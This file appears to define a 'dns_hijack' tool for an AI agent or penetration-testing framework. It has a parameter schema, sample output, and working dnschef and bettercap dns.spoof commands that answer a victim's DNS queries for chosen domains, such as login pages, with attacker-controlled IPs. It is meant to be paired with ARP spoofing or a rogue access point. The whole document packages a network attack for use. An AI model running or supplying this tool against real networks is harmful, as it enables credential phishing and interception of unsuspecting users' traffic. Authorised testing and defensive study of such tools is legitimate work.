---
name: dns_hijack
description: >
  Redirect specific DNS queries on an intercepted network flow. Combined with
  arp_spoof or a rogue AP, sends the victim to attacker-controlled IPs for
  chosen domains. DISRUPTIVE.
parameters_schema:
  type: object
  properties:
    interface:
      type: string
      description: Interface where the victim traffic flows
    mappings:
      type: array
      items:
        type: object
        properties:
          domain: {type: string}
          redirect_ip: {type: string}
      description: Domain-to-IP overrides (e.g. [{domain - "login.example.com", redirect_ip - "10.0.0.1"}])
    duration_s:
      type: integer
      description: How long to run. 0 = until stopped. Default 0.
  required:
    - interface
    - mappings
typical_duration_s: 60
sensitivity: disruptive
allowed_tools:
  - dns_hijack
---

# DNS Hijack

Intercepts UDP/53 traffic on the specified interface and responds to matching
queries with attacker-chosen IPs. Everything else is forwarded to the real
resolver. Used with `arp_spoof` or `wifi_evil_portal` to get control of the
traffic in the first place.

## What it returns

```json
{
  "mappings": [
    {"domain": "login.target.com", "redirect_ip": "10.0.0.1"}
  ],
  "queries_seen": 342,
  "queries_redirected": 7,
  "clients_affected": ["192.168.1.42"],
  "log_file": "captures/dns_hijack_1745174400.log"
}
```

## Implementation

`dnschef` or custom scapy sniffer:

```
sudo dnschef --fakedomains login.target.com --fakeip 10.0.0.1 --interface wlan0
```

Or `bettercap`'s `dns.spoof` module:

```
set dns.spoof.domains login.target.com
set dns.spoof.address 10.0.0.1
dns.spoof on
```

## Scope

- Only meaningful when combined with MITM positioning
- DoH/DoT clients bypass this entirely
- Modern browsers with DNS-over-HTTPS (Chrome, Firefox) aren't affected
